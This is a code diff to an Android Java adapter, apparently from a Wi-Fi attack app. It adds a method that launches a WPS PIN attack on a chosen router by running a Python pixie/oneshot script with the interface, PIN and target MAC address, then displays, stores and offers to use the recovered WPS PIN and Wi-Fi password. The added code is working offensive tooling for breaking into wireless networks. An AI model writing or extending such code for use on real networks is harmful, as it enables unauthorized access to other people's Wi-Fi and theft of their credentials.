@@ -461,7 +461,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             attackDialog(network, 7);
         });
 
-        // WPS Connect – manual PIN entry dialog
+        // WPS Connect – manual PIN entry (directly launches attack with entered PIN, no second dialog)
         if (wps_manual_connect != null) {
             if (!network.getWps()) {
                 wps_manual_connect.setVisibility(View.GONE);
@@ -473,7 +473,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 pinInput.setMaxLines(1);
                 new MaterialAlertDialogBuilder(context)
                         .setTitle("WPS Connect – Enter PIN")
-                        .setMessage("Enter the router's 8-digit WPS PIN to try connecting and retrieve the password.")
+                        .setMessage("Enter the router's WPS PIN to retrieve the password.")
                         .setView(pinInput)
                         .setPositiveButton("Connect", (d2, w) -> {
                             String pin = pinInput.getText() != null ? pinInput.getText().toString().trim() : "";
@@ -481,8 +481,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 Toast.makeText(context, "PIN too short", Toast.LENGTH_SHORT).show();
                                 return;
                             }
-                            network.setPin(pin);
-                            attackDialog(network, 5);
+                            attackDialogWithPin(network, pin);
                         })
                         .setNegativeButton(android.R.string.cancel, (d2, w) -> d2.dismiss())
                         .show();
@@ -517,6 +516,58 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             e.printStackTrace();
         }
         return out;
+    }
+
+    /** Directly run a WPS PIN attack with a pre-supplied PIN – skips the type-5 PIN entry dialog. */
+    public void attackDialogWithPin(WiFINetwork network, String pin) {
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.WPS_PIN_ONE,
+                network.getSsid(), targetMeta(network));
+        final AtomicBoolean canceled = new AtomicBoolean(false);
+
+        monitor.onStop(() -> {
+            canceled.set(true);
+            if (oneshot != null) oneshot.kill();
+            monitor.finish(false, "Attack stopped");
+            new Thread(this::restoreWpsInterface).start();
+        });
+
+        monitor.metric(AttackMetric.PIN, pin);
+        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
+        new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
+
+        String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
+                + core.wpsIfaceDownFlag() + " -p " + pin + " -b " + network.getMac();
+        oneshot = new AdvancedProcess(activity, context, cmd, true) {
+            @Override
+            public void onFinished(ArrayList<String> outputList) {
+                restoreWpsInterface();
+                WiFINetwork back = issuccess(outputList);
+                if (back.getOK()) {
+                    if (core.isStoreEnabled()) {
+                        core.saveNetwork(network.getMac(), back.getPsk(), back.getPin(), network.ssid);
+                    }
+                    monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "PIN accepted");
+                    monitor.finish(true, context.getResources().getString(R.string.piin)
+                            + back.getPin() + "\n"
+                            + context.getResources().getString(R.string.pass) + back.getPsk());
+                    offerConnect(monitor, network, back.getPsk());
+                } else if (Core.contains(outputList, "wps_locked")) {
+                    monitor.failStage(AttackStage.WPS, "Registrar locked",
+                            context.getString(R.string.wifi_wps_locked_result));
+                } else {
+                    monitor.finish(false, "PIN rejected – wrong PIN or WPS disabled.");
+                }
+            }
+
+            @Override
+            public void onNewLine(String line) {
+                monitor.wps(masked(line));
+            }
+
+            @Override
+            public void onEvent(String line) {
+            }
+        };
     }
 
     private static AttackKind kindFor(int type) {
